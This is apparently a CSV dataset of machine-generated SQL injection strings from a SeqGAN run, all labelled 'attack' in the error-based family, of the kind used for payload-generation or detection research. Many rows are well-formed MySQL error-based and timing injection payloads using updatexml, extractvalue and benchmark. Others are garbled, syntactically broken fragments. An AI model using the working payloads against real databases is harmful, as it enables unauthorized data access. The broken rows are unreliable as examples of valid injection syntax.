label,payload,family,payload_type,method,run_id,sample_index
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1306
attack,"1"" and extractvalue  (  (  (  (  (  (  (  =  (  (  3393,concat  (  (  (  0x2e,0x7171706a71,  (  (  (  select   (  elt  e  (  1759  (  (  (  0x5c,0x7171706a71,  (  (  extractvalue  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  elt  (  0x2e,md5  (  ut   (  (  elt  (  7982  =  (  7982  (  select   (  (  elt 0   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1307
attack,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'expkjh",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1308
attack,"1"" and extractvalue  (  (  (  (  (  (  (  3393,concat  (  (  =  (  (  1808,1   (  select   (  2501  (  (  (  0x5c,  (  9627,concat  (  (  (  (  0x5c,0x7171706a71,,md5  (  (  0x2e,0x7171706a71,  (  (  (  benchmark  (  (  0x2e,md5  (  (  select   (  elt  (  e  (  3393  =  (  (  (  0x2e,0x7171706a71,  (  5000000(  (    (  (  0x2e,md5  (  =",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1309
attack,"1or updatexml  (  (  7744  (  (  (  (  (  7151  5530  =  (  1297,concat  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,md5  (  (  1049  =  (  2917,concat  (  (  0x2e,0x7171706a71,  (  (  select   (  case 0 0 0 from d5  (  5847  )   (   and 0   (  5423  5777  (  (  elt  (  0x5c,  (  (  benchmark  (  (  0x2e,0x7171706a71,  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1310
attack,"1%'   )    proce anal  )  elys  (  elt  (  0x2e,0x7171706a71,  (  (  0x2e,0x7171706a71,  (  (  (  select   (  elt  (  elt  1297  =  (  (  0x5c,  (  (  5000000(  (  (  3393,concat  (  (  (  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  (  select   (  els  (  0x4b774c75   or,  (  (  (  1808  =  (  (  (  0x5c,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1311
attack,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""case%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1312
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1313
attack,"1%""   )    )    AND AND d(_named5  (  (  (  t  (  1297  (  =  (  (  3393,1   )    (  extractvalue  (  (  2917,1   )    (  select   (  extractvalue  (  (  9627,concat  (  (  0x2e,0x7171706a71,  (  5000000(  (  0x5c,0x7171706a71,  (  (  (  5000000(  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  select   (  elt  (  elt  (  1759  =  (  9627,concat  (  (  (  0x2e,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1314
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1315
attack," 61%%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1316
attack,"1' and extractvalue  (  (  (  (  (  (  (  (  (  (  (  (  0x5c,0x7171706a71(  (  (  benchmark  (  (  (  5000000(  (  0x2e,0x7171706a71,  (  benchmark  (  1808  =  (t  (  (  7982,concat  (  (  (  (  (  (  =  (  3393,md5  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  3393,  (  select   (  elt  (  elt  (  elt  (  0x2e,  (  (  select   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1317
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1318
attack,"1%""   )    )    OTi"" like ""roiecedure analyse  (  5777  (  0x2e,md5  (  0x2e,0x7171706a71,  (  5000000(  (  0x5c,  (  (  (  select   (  elt  (  elt  0x2e,md5  (  0x5c,md5  (  (  0x5c,  (  (  benchmark  (  (  (  5000000,md5  =  (  3393,1   SELECT 'i'  (  select   (  extractvalue  (  1297,1   )    )    )     (  extractvalue   (  )   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1319
attack,"1%""   )    )    AND 'i'  =  extractvalue  (  (  (  9627,concat  (  (  (  0x5c,0x7171706a71,  (  benchmark  (  (  (  (  5000000,0x7171706a71(  (  (  50000007636  (   (  (  (   from d 0from dual  )  elt  el  )  el  )  7636  )  /  (  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  3393  =  (  0x7171706a71,  (  (  5000000,md5(  0x2e,md5  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1320
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1321
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1322
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1323
attack,"1"" and extractvalue  (  (  (  (  (  (  (  (  (  3393,concat  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  (  (  e  (  select   (  elt  (  elt  =  a  7982,,  (  select   (  5777  (  (  1808  =  (  (  t  (  1808,  (  (  3393  (  (  0x2e,0x7171706a71,  (  =  9627,md5  (  (  1808  =  (  (  3393  (  (  (  0x5c,0x7171706a71,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1324
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1325
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1326
attack,"1%%%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1327
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1328
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1329
attack,"1%""   )    AND or updatexml  (  (  (  (  0x2e,0x7171706a71,  (  (  (  5000000,0x7171706a71,  (  (  (  (  (  (  select   (  eltt  elt  (  1297  =  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  (  5000000,md5  (  (  0x5c,  (  benchmark  (  (  5000000,md5  (  =  (  7982,1   )    (  select   (  case 0 from d an  (  =  6200  =  (  (  8868  )   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1330
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1331
attack,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1332
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1333
attack,"1%""   )    )    AND 7757  9338  =  8860  =  9338  )  case 1 and updatexml  (  (  0x2e,0x7171706a71,  (  (  (  (  benchmark  (  (  (  (  (  (  (  5000000,md5  (  (  (  (  (  (  1808=  (  (  (  (  (  (  (  (  0x5c,0x7171706a71(  (  benchmark  (  (  (  5000000(  (  (  3393,concat  (  (  (  (  0x2e,0x7171706a71,A  (  benchmark  (  0x2e,0x7171706a71,  (  (    (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1334
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1335
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1336
attack,"1%""   )    (  select   (  case from   (  (  3393,concat  (  (  1808  =  (  (  1297  =  (  9627(  select   (  elt  (  el  (  select 0 0 from(  (   SELECT d5 anal  el  )  1808  =  (  3393,1   )    (  extractvalue  (  (  9627,concat  (  (  (  select   (  elt  (  benchmark  (  3863  =  (  1049  =  (  (  0x5c,  (  extractvalue  (  (  9627,md5",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1337
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1338
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1339
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1340
attack,"1 ppCA      0x717a767a71   end  )  case when   (  extractvalue  (  5000000,md5  (  0x2e,md5  (  0x2e,0x7171706a71,  (  =  (  9627,concat  (  (  (  0x5c,  (  (  (  5000000,md5  (  (  0x2e,0x7171706a71  (  updatexml  (  (  (  benchmark  (  5000000  (  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  select   (  (  elt  (  elt  (  5000000  (  (  0x2e,0x7171706a71,  (  (  select   (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1341
attack,"1%%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1342
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%b""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1343
attack,"1%%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1344
attack,"1%pn%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1345
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'kbn"" like ""es anal--",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1346
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1347
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1348
attack,"1%"",updatexml  (  (  (  (  1297,concat  (  (  (  (  0x5c,md5  (  (  2162   (  (  1808  =  (  0x5c,  (  select   (  3393,0x7171706a71,  (  t  (  (  5000000,md5  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  7982  =  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  0x2e,0x7171706a71,  (  select   (  elt  (  case   )    ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1349
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1350
attack,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'zlxxw'  =  'zlx'  =  'jlw",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1351
attack,1%pkpcci,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1352
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1353
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1354
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1355
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1356
attack,"1%"" and extractvalue  (  (  (  3393,select   (  (  eltua  elt  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  5000000,0x7171706a71(  (  =  (  7982,concat  (  (  (  0x2e,  (  (  benchmark  (  (  5000000(  benchmark  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  benchmark  (  5000000(  (  1808=  (  (  (  1297  =  8768  (  e  (  0x4b774c75   (  (  elt  )  0x4b774c75   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1357
attack,"1%""   )    )     extractvalue  (  (  (  2162  (  3393,concat  (  (  (  3393,  (  (  5000000,md5  (  (  (  0x5c,0x7171706a71,  (  (  0x2e,  (  benchmark  (  5000000,md5  (  (  select   (  3393,1   )    )    AND 2162  =  1  =  3393  (  (  (  3393,concat  (  (  (  (  0x2e,0x7171706a71,  (  select   (  e  6581  (  (  3393  =  (  (  0x5c,0x7171706a71,  (  (  select   (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1358
attack,1%'  =  '%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1359
attack,"1% where updatexml  (  (  (  (  (  1 extractvalue  (  1297,concat  (  (  (  (  (  (  (  (  (  (  (  (  (  (  (  0x5c,0x7171706a71,updatexml  (  (  (  9627,md5  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  (     (  )  (  1808,  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  (  (  5000000(  (  (  3393  (  =  (  (  2917(  (  (  (  select",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1360
attack,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""ymhn'  =  'zn"" like ""gkn"" like ""kfb_namwb'  =  'ylynanalyte   (  (  (  elt  (  e  0x4b774c75   )    (  extractvalue  (  (  5  (  benchmark  (  (  =  1297,1   (  )   from d5  (  )  elt  (  elt  (  0x5c,0x7171706a71,  (  9627(  (  (  benchmark  (  (  (  concat  (  0x2e,0x7171706a71,  (  (  (  benchmark  (  (  benchmark  (  5000000,m(  (  (  3393",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1361
